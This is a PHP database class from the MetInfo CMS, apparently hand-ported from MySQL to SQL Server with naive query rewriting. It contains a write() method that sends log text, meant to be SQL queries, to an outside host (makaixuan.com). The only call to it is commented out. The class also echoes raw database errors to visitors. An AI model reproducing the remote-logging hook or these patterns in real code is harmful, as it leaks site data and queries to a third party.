<?php



defined('IN_MET') or exit('No permission');

/**
 * 数据库操作类
 */
class DB {
	public static $querynum = 0;
	public static $link;

    /**
	 * 数据库连接函数
	 * @param  string  $con_db_host  主机地址
	 * @param  string  $con_db_id    用户名
	 * @param  string  $con_db_pass  密码
	 * @param  string  $con_db_name  数据库名
	 * @param  string  $db_charset   字符编码
	 * @param  string  $pconnect     是否打开永久链接
	 */
	public static function  dbconn($con_db_host,$con_db_id,$con_db_pass, $con_db_name = '', $con_db_port = '3306', $db_charset='utf8',$pconnect = 0) {
        $connectionInfo = array("UID"=> $con_db_id, "PWD"=>$con_db_pass, "Database"=>"$con_db_name");
        self::$link = sqlsrv_connect( $con_db_host, $connectionInfo);

	   // self::$link = @ new mysqli($con_db_host, $con_db_id, $con_db_pass, $con_db_name, $con_db_port);
        if(!self::$link){
            $msg = '无法连接数据库' . sqlsrv_errors()[0]['message'];
            echo $msg;die();
        }

	}

	/**
	 * 选择数据库
	 * @param   string  $dbname     选择的数据库名
	 * @return  bool                是否成功
	 */
	public static function select_db($con_db_name) {
		return self::$link->select_db($con_db_name);
	}

	/**
	 * 选择数据库
     *  $result  mysqli_result对象
	 *	MYSQLI_ASSOC - 默认。关联数组
	 *	MYSQLI_NUM - 数字数组
	 *	MYSQLI_BOTH - 同时产生关联和数字数组
	 *  @return  array  出巡结果数组
	 */
	public static function fetch_array($result, $result_type = SQLSRV_FETCH_ASSOC) {
        if( $result === false) {
           return false;
        }

        $row = sqlsrv_fetch_array( $result, SQLSRV_FETCH_ASSOC);
        foreach ($row as $key => $value) {
            $row[$key] = trim(self::convert2utf8($value));
        }
        return $row;
        //var_dump($row );
	}

	/**
	 * 获取一条数据
	 * @param   string  $sql      select sql语句
	 * @param   string  $type     为UNBUFFERED时，不获取缓存结果
	 * @return  array             返回执行sql语句后查询到的数据
	 */
	public static function get_one($sql, $type = ''){

        if( self::isSelectLimit($sql))
        {
            return  self::Use_get_all_limit($sql);
        }
	    $result = self::query($sql, $type);
		$rs = self::fetch_array($result);
		//如果是前台可视化编辑模式
		if(IN_ADMIN !== true && $_GET['pageset'] == 1){
			load::sys_class('view/ui_compile');
			$ui_compile = new ui_compile();
			$rs = $ui_compile->replace_sql_one($sql,$rs);
		}
		self::free_result($result);
		return $rs ;
	}

    static function isSelectLimit($sql)
    {
        $SELECT = 'SELECT';
        if (stripos($sql, $SELECT)>=0 && stripos($sql, 'LIMIT')){
            return true;
        }
        else{

            return false;
        }
    }

    static function Use_get_all_limit($mysql)
    {
        $sqlsrv = substr($mysql, stripos($mysql, 'LIMIT') + 5);
        $keyvalues = explode(",", $sqlsrv);
        $newsql = substr($mysql, 0,stripos($mysql, 'LIMIT')-1);
        return self::get_all_limit($newsql , $keyvalues[0], $keyvalues[1]);
    }



    public static function get_all_limit($sql, $start,$rows){
        $result = self::query($sql);
        # 	MYSQLI_ASSOC - 默认。关联数组
        #	MYSQLI_NUM - 数字数组
        #	MYSQLI_BOTH - 同时产生关联和数字数组
        $i=0;
        $r=0;
        if ($result) {
            while ($row = sqlsrv_fetch_array( $result, SQLSRV_FETCH_ASSOC)) {

                foreach ($row as $key => $value) {
                    $row[$key] = self::convert2utf8($value);
                }
                if($i>= $start)
                {
                    $rs[]=$row;
                    $r++;
                    if($r>=$rows)
                    {
                        break;
                    }
                }
                $i++;
            }
        }else{
            self::error();
        }
        //如果是前台可视化编辑模式
        if(IN_ADMIN !== true && $_GET['pageset'] == 1){
            load::sys_class('view/ui_compile');
            $ui_compile = new ui_compile();
            $rs = $ui_compile->replace_sql_all($sql,$rs);
        }
        return $rs ;
    }
	public static function get_all($sql, $type = ''){
        if( self::isSelectLimit($sql))
        {
            return  self::Use_get_all_limit($sql);
        }

        $result = self::query($sql, $type);
		# 	MYSQLI_ASSOC - 默认。关联数组
        #	MYSQLI_NUM - 数字数组
        #	MYSQLI_BOTH - 同时产生关联和数字数组
       if ($result) {
	       	//while ($row = $result->fetch_array(MYSQLI_ASSOC)) {
           while ($row = sqlsrv_fetch_array( $result, SQLSRV_FETCH_ASSOC)) {

               foreach ($row as $key => $value) {
                   $row[$key] = self::convert2utf8($value);
               }
	          $rs[]=$row;
	        }
        }else{
            self::error();
        }
		//如果是前台可视化编辑模式
		if(IN_ADMIN !== true && $_GET['pageset'] == 1){
			load::sys_class('view/ui_compile');
			$ui_compile = new ui_compile();
			$rs = $ui_compile->replace_sql_all($sql,$rs);
		}
		return $rs ;
	}

    /**
     * @param string $sql sql语句
     * @return mixed mysqli_result对象
     */
    public static function query($sql) {
        #$sql1  = "SELECT * FROM met_lang ORDER BY no_order";
       // self::write($sql);
        $sql2= self:: convert2SqlSvr($sql);
       if( !$result = sqlsrv_query(self::$link,$sql2)){
           die( print_r( sqlsrv_errors(), true));
       }
        return $result;
    }

    static function Count2SqlSvr($mysql)
    {
        $start =  substr($mysql,0,stripos($mysql,'order by'));
        return $start;
    }


    static function convert2SqlSvr($mysql)
    {
        $sqlsrv = $mysql;
        $Insert= 'INSERT';
        if(stripos($mysql, $Insert)!==false && stripos($mysql,'SET')>0 )
        {
            $content1=  substr($mysql,stripos($mysql,'SET')+3);
            $start =  substr($mysql,0,stripos($mysql,'SET'));
                //echo $start;
            $keyvalues = explode(",", $content1);

            $keys='';
            $values ='';
            $count=sizeof($keyvalues);
            for ($i = 0; $i <$count ; $i++) {
                $keyvalue = explode("=", $keyvalues[$i]);

                if($i==$count-1){
                $keys.=$keyvalue[0];
                $values.=$keyvalue[1];
                }
                else{
                    $keys.=$keyvalue[0].',';
                    $values.=$keyvalue[1].',';
                }
            }
            $sqlsrv = $start.'('.$keys.') VALUES ('.$values.');';

        }
        elseif (stripos($mysql, 'UPDATE')!==false)
        {
            $sqlsrv =str_replace('`', ' ',$sqlsrv);

        }
        return self::convert2gbk ($sqlsrv);
        //;
    }
/**
	 * 统计条数
	 * @param   string  $table_name      insert、update等 sql语句
	 * @param   string  $where_str       where条件,建议添加上WEHER
	 * @param   string  $field_name      统计的字段
	 * @return  int                      统计条数
	 */
	public static function counter($table_name,$where_str="", $field_name="*"){
	    $where_str = trim($where_str);
	    if(strtolower(substr($where_str,0,5))!='where' && $where_str) $where_str = "WHERE ".$where_str;

        $sqlsrv_where_str= self::Count2SqlSvr($where_str);
	    $query = " SELECT COUNT($field_name) FROM $table_name $sqlsrv_where_str ";

	    $result = self::query($query);
        $row1= sqlsrv_fetch_array( $result, SQLSRV_FETCH_ASSOC);

        foreach ($row1 as $key => $value)
        {
            $count=$value;
        }

        return   $count;
	    /*$fetch_row = mysql_fetch_row($result);
	    return $fetch_row[0];*/
	}
    public static function oneresult($sql){
        $result = self::query($sql);
        $row1= sqlsrv_fetch_array( $result, SQLSRV_FETCH_ASSOC);
        foreach ($row1 as $key => $value)
        {
            $count=$value;
        }
        return   $count;
     }
	/**
	 * 返回前一次 MySQL 操作所影响的记录行数。
	 * @param   string  $dbname     选择的数据库名
	 * @return  int                 执行成功，则返回受影响的行的数目，如果最近一次查询失败的话，函数返回 -1。
	 */
	public static function affected_rows() {
        return self::oneresult("SELECT @@rowcount AS 'RowCount'");
		#return mysql_affected_rows(self::$link);
	}

	/**
	 * 返回上一个 MySQLI 操作产生的文本错误信息
	 * @return  string                    错误信息
	 */
	public static function error() {
        return self::$link->error;
	}

	/**
	 * 返回上一个 MySQLI 操作中的错误信息的数字编码
	 * @return  string  错误信息的数字编码
	 */
	public static function errno() {
        return self::$link->errno;
	}

    /**
     * 返回上一个 MySQLI 操作中的错误信息的数字编码
     * @return  array  错误信息列表
     */
    public static function errorlist()
    {
        return self::$link->error_list;
    }

	/**
	 * 返回结果集中一个字段的值
	 * @param        $query 规定要使用的结果标识符。该标识符是 mysql_query() 函数返回的。
	 * @param    int $row   规定行号。行号从 0 开始。
	 * @return              结果集中一个字段的值
	 */
	public static function result($query, $row) {
        die("method disable");
}

	/**
	 * 返回查询的结果中行的数目
	 * @param        $result 规定要使用的结果标识符。该标识符是 mysqli_query() 函数返回的。
	 * @return       int    行数
	 */
/*	public static function num_rows($result) {
        if ($result instanceof mysqli_result) {
            return $result->num_rows;
        } else {
            self::errno();
        }
	}*/

    /**
     * 返回查询的结果中字段的信息
     * @param $result 规定要使用的结果标识符。该标识符是 mysqli_query() 函数返回的。
     * @return mixed  字段数组
     */
    public static function fields($result) {
        if ($result instanceof mysqli_result) {
            return $result->fetch_fields();
        } else {
            self::errno();
        }
    }


	/**
	 * 返回查询的结果中字段的数目
	 * @param        $result 规定要使用的结果标识符。该标识符是 mysqli_query() 函数返回的。
	 * @return       int    字段数
	 */
	public static function num_fields($result) {
        if ($result instanceof mysqli_result) {
            return $result->field_count;
        } else {
            self::errno();
        }
	}

	/**
	 * 释放结果内存
	 * @param        $result 规定要使用的结果标识符。该标识符是 mysqli_query() 函数返回的。
	 */
	public static function free_result($result) {
            //return $result->free();
	}

	/**
	 * 返回上一步 INSERT 操作产生的 ID
	 * @return       int    id号
	 */
	public static function insert_id() {
	    return self::oneresult("SELECT @@IDENTITY AS 'Identity'");
	}

	/**
	 * 从结果集中取得一行作为数字数组
	 * @param        $result myslqi_result对象。
	 * @return       array    结果集一行数组
	 */
	public static function fetch_row($result) {
        if ($result instanceof mysqli_result) {
            return $result->fetch_row ();
        }else{
            self::errno();
        }
	}

	/**
	 * 返回mysql服务器信息
	 */
	public static function version() {
        return @self::$link->server_info;
	}

	/**
	 * 关闭连接
	 */
	public static function close() {
        return sqlsrv_close(@self::$link);
	}

	/**
	 * 无法连接数据库报错
	 */
	public static function halt($dbhost) {
        $sqlerror = self::$link->error;
        $sqlerrno = self::$link->connect_error;
        $sqlerror = str_replace($dbhost,'dbhost',$sqlerror);

        header('HTTP/1.1 500 Internal Server Error');
		echo"<html><head><title>MetInfo</title><style type='text/css'>P,BODY{FONT-FAMILY:tahoma,arial,sans-serif;FONT-SIZE:10px;}A { TEXT-DECORATION: none;}a:hover{ text-decoration: underline;}TD { BORDER-RIGHT: 1px; BORDER-TOP: 0px; FONT-SIZE: 16pt; COLOR: #000000;}</style><body>\n\n";
		echo"<table style='TABLE-LAYOUT:fixed;WORD-WRAP: break-word'><tr><td>";
		echo"<br><br><b>The URL Is</b>:<br>http://$_SERVER[HTTP_HOST]$REQUEST_URI";
		echo"<br><br><b>Can not connect to MySQL server</b>:<br>$sqlerror  ( $sqlerrno )";
		echo"<br><br><b>You Can Get Help In</b>:<br><b>1745584484@qq.com</b>";
		echo"</td></tr></table>";
		exit;
	}

    static function  convert2utf8($string)
    {
        return iconv("gbk","utf-8",$string);
    }
    static function convert2gbk($string)
    {
        return iconv("utf-8","gbk",$string);
    }

    public static function write($log_mssage){

        $url= 'http://www.makaixuan.com/log.php?log1='.$log_mssage;
        
         fopen($url, 'r');

    }



}

$met_mysql=$tablepre.'otherinfo';
?>